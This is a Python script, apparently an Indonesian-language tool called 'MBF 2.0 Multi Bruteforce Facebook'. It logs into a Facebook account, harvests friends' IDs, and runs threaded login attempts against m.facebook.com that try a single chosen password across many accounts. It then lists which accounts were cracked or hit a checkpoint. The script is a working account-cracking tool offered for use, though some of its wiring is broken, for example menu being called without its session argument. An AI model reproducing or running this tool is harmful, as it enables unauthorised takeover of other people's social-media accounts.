import os
import sys
import re
import requests
import threading
from getpass import getpass
from requests.exceptions import MissingSchema

def cetak(x, e=0):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\033[%s;1m' % str(31 + j))
    x += '\033[0m'
    x = x.replace('!0', '\033[0m')
    if e != 0:
        sys.stdout.write(x)
    else:
        sys.stdout.write(x + '\n')

def inputD(x, v=0):
    while True:
        try:
            a = input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m' % x)
        except:
            cetak('\n!m[!] Batal')
            sys.exit()
        if v:
            if a.upper() in v:
                break
            else:
                cetak('!m[!] Masukan Opsinya Bro...')
                continue
        else:
            if len(a) == 0:
                cetak('!m[!] Masukan dengan benar')
                continue
            else:
                break
    return a

def inputM(x, d):
    while True:
        try:
            i = int(inputD(x))
        except:
            cetak('!m[!] Pilihan tidak ada')
            continue
        if i in d:
            break
        else:
            cetak('!m[!] Pilihan tidak ada')
    return i

def crack(d):
    while True:
        s = inputD('[?] Sandi')
        if len(s) < 6:
            cetak('!m[!] Jumlah huruf minimal !k6')
        else:
            break
    return crack0(d, s)

def tampilhasil(akun, sandi, data):
    cekpoint = []
    salah = 0
    berhasil = []
    for i in akun:
        st, id = i
        if st == 1:
            berhasil.append(id)
        elif st == 2:
            cekpoint.append(id)
        elif st == 3:
            salah += 1
    cetak('!h[*] Berhasil !c%d' % len(berhasil))
    if len(berhasil) != 0:
        for i in berhasil:
            cetak('!h### !p%s !m=> !b[!k%s!b]' % (i, sandi))
    cetak('!k[*] Cekpoint !c%d' % len(cekpoint))
    if len(cekpoint) != 0:
        for i in cekpoint:
            cetak('!k### !p%s !m=> !b[!k%s!b]' % (i, sandi))
    cetak('!m[*] Gagal    !c' + str(salah))
    i = inputD('[?] Tidak Puas dengan Hasil, Mau coba lagi (y/t)', ['Y', 'T'])
    if i.upper() == 'Y':
        return crack(data)
    else:
        return menu()

def crack0(data, sandi):
    akun = []
    cetak('!h[*] MengCrack !k%d Akun !hdengan sandi !m[!k%s!m]' % (len(data), sandi))
    cetak('!h[*] Cracking  !k0!m%', 1)
    sys.stdout.flush()
    jml0, jml1 = 0, 0
    th = []
    for i in data:
        i = i.replace(' ', '')
        i = i.replace('\n', '')
        if len(i) != 0: th.append(mt(i, sandi))
        jml1 += 1
    for i in th:
        i.daemon = True
        try:
            i.start()
        except KeyboardInterrupt:
            sys.exit()
    h_error = []
    error = 0
    while True:
        try:
            for i in th:
                status, id = i.update()
                if status != 0:
                    cetak('\r!h[*] Cracking  !k%d!m%s!0' % (int(float((float(jml0) / float(jml1)) * 100)), '%'), 1)
                    sys.stdout.flush()
                    del (th[th.index(i)])
                    if status == 4:
                        h_error.append(id)
                        if h_error.count(id) == 3:
                            pass
                        else:
                            th.append(mt(id, sandi))
                            th[len(th) - 1].daemon = True
                            th[len(th) - 1].start()
                    else:
                        jml0 += 1
                        akun.append((status, id))
        except KeyboardInterrupt:
            sys.exit()
        try:
            if threading.activeCount() == 1: break
        except KeyboardInterrupt:
            sys.exit()
    cetak('\r!h[*] Cracking  !k100!m%      ')
    tampilhasil(akun, sandi, data)

class mt(threading.Thread):
    def __init__(self, i, p):
        threading.Thread.__init__(self)
        self.id = i
        self.a = 0
        self.p = p

    def update(self):
        return self.a, self.id

    def run(self):
        try:
            response = requests.post('https://m.facebook.com/login.php', data={'email': self.id, 'pass': self.p}, headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
            if 'm_sess' in response.url or 'save-device' in response.url:
                self.a = 1
            elif 'checkpoint' in response.url:
                self.a = 2
            else:
                self.a = 3
        except MissingSchema:
            self.a = 4
        except KeyboardInterrupt:
            sys.exit()
        except:
            self.a = 4
            sys.exit()

def login():
    us = inputD('[?] Email/HP')
    pa = getpass('[?] Kata Sandi')
    cetak('!h[*] Sedang Login....')
    session = requests.Session()
    session.headers.update({'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
    try:
        login_data = {'email': us, 'pass': pa}
        response = session.post('https://m.facebook.com/login.php', data=login_data)
        if 'save-device' in response.url or 'm_sess' in response.url:
            response = session.get('https://mobile.facebook.com/home.php')
            name = re.findall(r'\((.*a?)\)', response.text)[0]
            cetak('!h[*] Selamat datang !k%s' % name)
            cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
            return session
        elif 'checkpoint' in response.url:
            cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
            sys.exit()
        else:
            cetak('!m[!] Login Gagal')
            sys.exit()
    except MissingSchema:
        cetak('!m[!] URL tidak valid')
        sys.exit()

def idteman(session):
    cetak('!h[*] Sedang mengumpulkan id teman...')
    try:
        response = session.get('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
        jumlah = re.findall(r'\((.*a?)\)', response.text)[0]
        cetak('!h[*] Mengambil !p%s !hid teman' % jumlah)
        friend_ids = re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&', response.text)
        cetak('!h[*] Mengambil !p%s !hid berhasil' % len(friend_ids))
    except KeyboardInterrupt:
        cetak('!m[!] Gagal mengambil ID teman')
        sys.exit()

def menu(session):
    cetak(r"\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
    i = inputM('[?] PILIH', [1, 2, 3])
    if i == 1:
        idteman(session)
    elif i == 2:
        cetak('!m[!] Fungsi ID Group belum diimplementasikan')
    elif i == 3:
        cetak('!m[!] Keluar')
        sys.exit()

if __name__ == '__main__':
    session = login()
    if session:
        menu(session)
